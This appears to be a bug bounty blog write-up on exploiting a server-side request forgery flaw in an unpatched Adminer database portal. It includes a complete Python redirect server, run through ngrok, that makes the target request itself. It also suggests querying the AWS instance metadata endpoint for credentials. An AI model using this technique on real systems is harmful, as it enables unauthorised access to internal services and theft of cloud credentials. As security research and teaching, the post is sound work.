---
title: Adminer SSRF in the wild
tags:
  - Bug Bounty
---

Came across an Admirer portal while doing some subdomain enumerations in a bug bounty program.

![portal.png](https://Mizuno-Ai.wu-kan.cn/assets/image/2021/05/20/1tvAo2I9FK6sVLP.jpg)

    What is Adminer?

    Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to [phpMyAdmin], it consists of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch, MongoDB and others via plugin.

Took me few minutes of googling to know that the software version running has CVEs assigned, would they be patched on this instance tho? lets give it a try.

##Setting up the enviroment

Now that I think of it I could have done it with help of a collaborator and call it a day but I went for the good old and reliable ngrok, I also had to use a python script so my ngrok would redirect the petition and trick the server into "hitting" itself.

![setup.png](https://Mizuno-Ai.wu-kan.cn/assets/image/2021/05/20/1tvAo2I9FK6sVLP.jpg)

There we've the content of the script.

```cpp
#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    Returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler


def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

I simply redirected the requests that Im gonna receive on my ngrok to the victim web server, port 443, whichs the Admirer portal itself in this case. If it worked we'd be able to reach the Admirer portal as if we were doing it from localhost.

##Results

We can appreciate in the output that we indeed reached the portal from inside, giving us access to internal services such as the "DEV version..".

Not only that we could use this to scan the internal network, search for some internal APIs and escalate the impact, maybe even just check for AWS credentials trying to reach http://169.254.169.254/latest/meta-data/instance-id if the victim had the service hosted on Amazon.

![localhost.png](https://Mizuno-Ai.wu-kan.cn/assets/image/2021/05/20/1tvAo2I9FK6sVLP.jpg)